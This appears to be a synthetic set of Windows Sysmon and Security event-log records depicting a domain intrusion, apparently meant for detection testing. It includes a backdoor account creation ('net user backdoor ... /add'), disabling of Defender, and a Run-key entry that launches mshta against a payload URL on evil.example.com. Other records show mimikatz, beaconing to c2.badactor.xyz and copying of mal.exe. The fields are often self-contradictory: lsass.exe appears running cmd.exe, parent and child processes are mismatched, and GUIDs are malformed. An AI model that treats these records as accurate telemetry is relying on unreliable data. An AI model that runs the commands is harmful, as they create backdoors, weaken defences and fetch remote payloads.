<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>12</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:34:19.0000000Z" /><EventRecordID>1966</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>SRV-FILE01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T18:34:19.0000000Z</Data><Data Name="EventType">DeleteKey</Data><Data Name="ProcessId">52948</Data><Data Name="Image">C:\Windows\System32\cmd.exe</Data><Data Name="TargetObject">HKLM\SYSTEM\CurrentControlSet\Services\mal_persist\ImagePath</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>12</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:34:26.0000000Z" /><EventRecordID>1967</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>SRV-WEB01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T18:34:26.0000000Z</Data><Data Name="EventType">CreateKey</Data><Data Name="ProcessId">13461</Data><Data Name="Image">C:\Windows\System32\cmd.exe</Data><Data Name="TargetObject">HKLM\Software\Policies\Microsoft\Windows Defender\DisableAntiSpyware</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>1</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:34:34.0000000Z" /><EventRecordID>1968</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>SRV-SQL01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T18:34:34.0000000Z</Data><Data Name="ProcessGuid">{17775-1242E-1447B-1117B}</Data><Data Name="ProcessId">26380</Data><Data Name="Image">C:\Windows\System32\regsvr32.exe</Data><Data Name="CommandLine">powershell.exe Get-Process | Export-Csv C:\temp\procs.csv</Data><Data Name="User">.\bob</Data><Data Name="ParentProcessId">6143</Data><Data Name="ParentImage">C:\Users\alice\AppData\Roaming\implant.exe</Data><Data Name="ParentCommandLine">net user backdoor P@ssw0rd123 /add</Data><Data Name="Hashes">MD5=037864e6af31be0a6c2a500926dff173,SHA256=b10b263066e8f300f1132992a6e6fc5a301062045071d7fc30ee21aa7d6215ef</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:34:37.0000000Z" /><EventRecordID>1969</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-FILE01</Computer></System><EventData><Data Name="SubjectUserName">admin</Data><Data Name="SubjectDomainName">CONTOSO</Data><Data Name="NewProcessId">0xe7d0</Data><Data Name="NewProcessName">C:\Users\alice\Downloads\setup.exe</Data><Data Name="CommandLine">powershell.exe -ExecutionPolicy Bypass -File C:\temp\run.ps1</Data><Data Name="ParentProcessName">C:\Windows\System32\net.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0x289</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>1</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:34:53.0000000Z" /><EventRecordID>1970</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T18:34:53.0000000Z</Data><Data Name="ProcessGuid">{1242A-1427F-1417B-D580}</Data><Data Name="ProcessId">8848</Data><Data Name="Image">C:\Windows\System32\lsass.exe</Data><Data Name="CommandLine">cmd.exe /c whoami &amp;&amp; net user</Data><Data Name="User">CORP\t.miller</Data><Data Name="ParentProcessId">5294</Data><Data Name="ParentImage">C:\Windows\System32\powershell.exe</Data><Data Name="ParentCommandLine">net user backdoor P@ssw0rd123 /add</Data><Data Name="Hashes">MD5=6d0be34fe52c7e89a46079d279c8f66c,SHA256=28a01f4b68e4f70997f0d0db2f73481b5ec70e0e737d65f01c3eda4c2be231aa</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:35:04.0000000Z" /><EventRecordID>1971</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-CHARLIE</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-7750-2218-9699-1001</Data><Data Name="TargetUserName">SYSTEM</Data><Data Name="TargetDomainName">CONTOSO</Data><Data Name="LogonType">3</Data><Data Name="IpAddress">203.0.113.45</Data><Data Name="IpPort">5946</Data><Data Name="ProcessName">C:\Windows\System32\net.exe</Data><Data Name="WorkstationName">WKSTN-CHARLIE</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:35:15.0000000Z" /><EventRecordID>1972</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-CHARLIE</Computer></System><EventData><Data Name="SubjectUserName">alice</Data><Data Name="SubjectDomainName">CONTOSO</Data><Data Name="NewProcessId">0xc638</Data><Data Name="NewProcessName">C:\Users\alice\Downloads\setup.exe</Data><Data Name="CommandLine">powershell.exe -ExecutionPolicy Bypass -File C:\temp\run.ps1</Data><Data Name="ParentProcessName">C:\Windows\SysWOW64\rundll32.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0x27d</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:35:19.0000000Z" /><EventRecordID>1973</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-2559-5328-6468-1001</Data><Data Name="TargetUserName">t.miller</Data><Data Name="TargetDomainName">CORP</Data><Data Name="LogonType">3</Data><Data Name="IpAddress">198.51.100.23</Data><Data Name="IpPort">59246</Data><Data Name="ProcessName">C:\Windows\System32\powershell.exe</Data><Data Name="WorkstationName">JUMPHOST01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4625</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:35:20.0000000Z" /><EventRecordID>1974</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>LAPTOP-MGMT</Computer></System><EventData><Data Name="SubjectUserName">-</Data><Data Name="TargetUserName">svc_backup</Data><Data Name="TargetDomainName">CORP</Data><Data Name="LogonType">3</Data><Data Name="FailureReason">%%2313</Data><Data Name="Status">0xc000006d</Data><Data Name="SubStatus">0xc0000064</Data><Data Name="IpAddress">192.168.1.200</Data><Data Name="IpPort">19145</Data><Data Name="WorkstationName">LAPTOP-MGMT</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:35:48.0000000Z" /><EventRecordID>1975</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="SubjectUserName">jane.smith</Data><Data Name="SubjectDomainName">.</Data><Data Name="NewProcessId">0xf804</Data><Data Name="NewProcessName">C:\Windows\System32\reg.exe</Data><Data Name="CommandLine">cmd.exe /c whoami &amp;&amp; net user</Data><Data Name="ParentProcessName">C:\Windows\System32\lsass.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0x9d6</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>3</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:36:37.0000000Z" /><EventRecordID>1976</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKSTN-CHARLIE</Computer></System><EventData><Data Name="UtcTime">2024-11-25T18:36:37.0000000Z</Data><Data Name="Image">C:\Windows\System32\cmd.exe</Data><Data Name="User">CORP\svc_sql</Data><Data Name="Protocol">tcp</Data><Data Name="SourceIp">10.100.10.50</Data><Data Name="SourcePort">7116</Data><Data Name="DestinationIp">10.100.10.50</Data><Data Name="DestinationPort">1337</Data><Data Name="DestinationHostname">update.legit.com</Data><Data Name="Initiated">true</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4672</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:36:38.0000000Z" /><EventRecordID>1977</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="SubjectUserName">alice</Data><Data Name="SubjectDomainName">CORP</Data><Data Name="SubjectLogonId">0xa69b1b</Data><Data Name="PrivilegeList">SeSecurityPrivilege
			SeBackupPrivilege
			SeRestorePrivilege</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:37:04.0000000Z" /><EventRecordID>1978</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC02</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-6916-7651-9879-1001</Data><Data Name="TargetUserName">john.doe</Data><Data Name="TargetDomainName">CORP</Data><Data Name="LogonType">2</Data><Data Name="IpAddress">172.16.5.10</Data><Data Name="IpPort">18344</Data><Data Name="ProcessName">C:\Windows\System32\wscript.exe</Data><Data Name="WorkstationName">DC02</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>1</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:37:10.0000000Z" /><EventRecordID>1979</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T18:37:10.0000000Z</Data><Data Name="ProcessGuid">{085D9-17316-14A65-5C3E}</Data><Data Name="ProcessId">42342</Data><Data Name="Image">C:\Windows\System32\regsvr32.exe</Data><Data Name="CommandLine">net user backdoor P@ssw0rd123 /add</Data><Data Name="User">CORP\bob</Data><Data Name="ParentProcessId">7805</Data><Data Name="ParentImage">C:\Windows\SysWOW64\rundll32.exe</Data><Data Name="ParentCommandLine">net user backdoor P@ssw0rd123 /add</Data><Data Name="Hashes">MD5=92458fba6d124ab516e26c2012ce5b2b,SHA256=8b80e4bc360f11f5331a7ad282a723dd8eebb4ae2cae7a82de01143dfd7e59fd</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4698</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:38:56.0000000Z" /><EventRecordID>1980</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC01</Computer></System><EventData><Data Name="SubjectUserName">svc_sql</Data><Data Name="SubjectDomainName">NT AUTHORITY</Data><Data Name="TaskName">\exfil_daily</Data><Data Name="TaskContent">&lt;Task&gt;&lt;Actions&gt;&lt;Exec&gt;&lt;Command&gt;powershell.exe&lt;/Command&gt;&lt;/Exec&gt;&lt;/Actions&gt;&lt;/Task&gt;</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4663</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:39:10.0000000Z" /><EventRecordID>1981</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-BOB</Computer></System><EventData><Data Name="SubjectUserName">alice</Data><Data Name="SubjectDomainName">NT AUTHORITY</Data><Data Name="ObjectName">C:\temp\cobalt.exe</Data><Data Name="ObjectType">File</Data><Data Name="AccessList">%%4417
			%%4418</Data><Data Name="ProcessName">C:\Windows\System32\mshta.exe</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>22</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:39:15.0000000Z" /><EventRecordID>1982</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T18:39:15.0000000Z</Data><Data Name="ProcessId">27510</Data><Data Name="Image">C:\Windows\SysWOW64\rundll32.exe</Data><Data Name="QueryName">update.legit.com</Data><Data Name="QueryStatus">0</Data><Data Name="QueryResults">10.100.10.50</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>1</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:39:44.0000000Z" /><EventRecordID>1983</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKSTN-CHARLIE</Computer></System><EventData><Data Name="UtcTime">2024-11-25T18:39:44.0000000Z</Data><Data Name="ProcessGuid">{066E1-FE37-A99F-17302}</Data><Data Name="ProcessId">40666</Data><Data Name="Image">C:\Windows\SysWOW64\rundll32.exe</Data><Data Name="CommandLine">net user backdoor P@ssw0rd123 /add</Data><Data Name="User">NT AUTHORITY\t.miller</Data><Data Name="ParentProcessId">123</Data><Data Name="ParentImage">C:\Windows\System32\regsvr32.exe</Data><Data Name="ParentCommandLine">cmd.exe /c whoami &amp;&amp; net user</Data><Data Name="Hashes">MD5=6fcbd16758903a976b2ff030e1572dbf,SHA256=726dc040d208f9b0ae20d120611b9d93c214322f458c7fd0eed00ca4cb418894</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:39:52.0000000Z" /><EventRecordID>1984</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-BOB</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-1762-2182-7467-1001</Data><Data Name="TargetUserName">charlie</Data><Data Name="TargetDomainName">CORP</Data><Data Name="LogonType">2</Data><Data Name="IpAddress">192.168.1.200</Data><Data Name="IpPort">64280</Data><Data Name="ProcessName">C:\Windows\System32\mshta.exe</Data><Data Name="WorkstationName">WKSTN-BOB</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4672</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:39:53.0000000Z" /><EventRecordID>1985</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>LAPTOP-MGMT</Computer></System><EventData><Data Name="SubjectUserName">bob</Data><Data Name="SubjectDomainName">CONTOSO</Data><Data Name="SubjectLogonId">0xc79ccf</Data><Data Name="PrivilegeList">SeSecurityPrivilege
			SeBackupPrivilege
			SeRestorePrivilege</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:40:00.0000000Z" /><EventRecordID>1986</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC01</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-8324-3365-3408-1001</Data><Data Name="TargetUserName">SYSTEM</Data><Data Name="TargetDomainName">CORP</Data><Data Name="LogonType">10</Data><Data Name="IpAddress">198.51.100.23</Data><Data Name="IpPort">43488</Data><Data Name="ProcessName">C:\Windows\System32\powershell.exe</Data><Data Name="WorkstationName">DC01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:40:15.0000000Z" /><EventRecordID>1987</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-FILE01</Computer></System><EventData><Data Name="SubjectUserName">jane.smith</Data><Data Name="SubjectDomainName">CONTOSO</Data><Data Name="NewProcessId">0xeb95</Data><Data Name="NewProcessName">C:\Users\alice\Downloads\setup.exe</Data><Data Name="CommandLine">wscript.exe C:\Users\Public\doc.vbs</Data><Data Name="ParentProcessName">C:\Windows\SysWOW64\rundll32.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0xb29</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4625</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:40:19.0000000Z" /><EventRecordID>1988</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-BOB</Computer></System><EventData><Data Name="SubjectUserName">-</Data><Data Name="TargetUserName">SYSTEM</Data><Data Name="TargetDomainName">.</Data><Data Name="LogonType">3</Data><Data Name="FailureReason">%%2313</Data><Data Name="Status">0xc000006d</Data><Data Name="SubStatus">0xc0000064</Data><Data Name="IpAddress">192.168.1.200</Data><Data Name="IpPort">33130</Data><Data Name="WorkstationName">WKSTN-BOB</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4776</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:40:20.0000000Z" /><EventRecordID>1989</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-CHARLIE</Computer></System><EventData><Data Name="PackageName">MICROSOFT_AUTHENTICATION_PACKAGE_V1_0</Data><Data Name="TargetUserName">SYSTEM</Data><Data Name="Workstation">SRV-WEB01</Data><Data Name="Status">0x0</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4768</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:40:44.0000000Z" /><EventRecordID>1990</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="TargetUserName">alice</Data><Data Name="TargetDomainName">NT AUTHORITY</Data><Data Name="ServiceName">krbtgt</Data><Data Name="IpAddress">::10.0.0.5</Data><Data Name="Status">0x25</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:40:54.0000000Z" /><EventRecordID>1991</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-BOB</Computer></System><EventData><Data Name="SubjectUserName">svc_sql</Data><Data Name="SubjectDomainName">.</Data><Data Name="NewProcessId">0x3d53</Data><Data Name="NewProcessName">C:\Users\alice\Downloads\setup.exe</Data><Data Name="CommandLine">cmd.exe /c whoami &amp;&amp; net user</Data><Data Name="ParentProcessName">C:\Windows\System32\wscript.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0x7d1</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>13</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:41:13.0000000Z" /><EventRecordID>1992</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>DC01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T18:41:13.0000000Z</Data><Data Name="EventType">SetValue</Data><Data Name="ProcessId">30781</Data><Data Name="Image">C:\Tools\mimikatz.exe</Data><Data Name="TargetObject">HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Update</Data><Data Name="Details">mshta.exe http://evil.example.com/payload.hta</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:41:26.0000000Z" /><EventRecordID>1993</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-BOB</Computer></System><EventData><Data Name="SubjectUserName">svc_sql</Data><Data Name="SubjectDomainName">.</Data><Data Name="NewProcessId">0x3913</Data><Data Name="NewProcessName">C:\Windows\System32\net.exe</Data><Data Name="CommandLine">net user backdoor P@ssw0rd123 /add</Data><Data Name="ParentProcessName">C:\Windows\System32\net.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0x8af</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4648</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:41:43.0000000Z" /><EventRecordID>1994</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-SQL01</Computer></System><EventData><Data Name="SubjectUserName">charlie</Data><Data Name="SubjectDomainName">NT AUTHORITY</Data><Data Name="TargetUserName">alice</Data><Data Name="TargetDomainName">CONTOSO</Data><Data Name="TargetServerName">JUMPHOST01</Data><Data Name="IpAddress">192.168.1.200</Data><Data Name="ProcessName">C:\Windows\System32\reg.exe</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>3</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:42:30.0000000Z" /><EventRecordID>1995</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="UtcTime">2024-11-25T18:42:30.0000000Z</Data><Data Name="Image">C:\Windows\System32\cmd.exe</Data><Data Name="User">.\jane.smith</Data><Data Name="Protocol">tcp</Data><Data Name="SourceIp">203.0.113.45</Data><Data Name="SourcePort">46237</Data><Data Name="DestinationIp">203.0.113.45</Data><Data Name="DestinationPort">80</Data><Data Name="DestinationHostname">update.legit.com</Data><Data Name="Initiated">true</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>3</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:43:18.0000000Z" /><EventRecordID>1996</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T18:43:18.0000000Z</Data><Data Name="Image">C:\Windows\System32\regsvr32.exe</Data><Data Name="User">NT AUTHORITY\alice</Data><Data Name="Protocol">tcp</Data><Data Name="SourceIp">10.0.1.12</Data><Data Name="SourcePort">38193</Data><Data Name="DestinationIp">203.0.113.45</Data><Data Name="DestinationPort">80</Data><Data Name="DestinationHostname">c2.badactor.xyz</Data><Data Name="Initiated">true</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:43:44.0000000Z" /><EventRecordID>1997</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-CHARLIE</Computer></System><EventData><Data Name="SubjectUserName">t.miller</Data><Data Name="SubjectDomainName">CONTOSO</Data><Data Name="NewProcessId">0xb0a5</Data><Data Name="NewProcessName">C:\Windows\System32\mshta.exe</Data><Data Name="CommandLine">C:\Windows\System32\cmd.exe /c copy \\10.0.1.12\admin$\mal.exe C:\temp</Data><Data Name="ParentProcessName">C:\Windows\System32\lsass.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0x8f3</Data></EventData></Event>
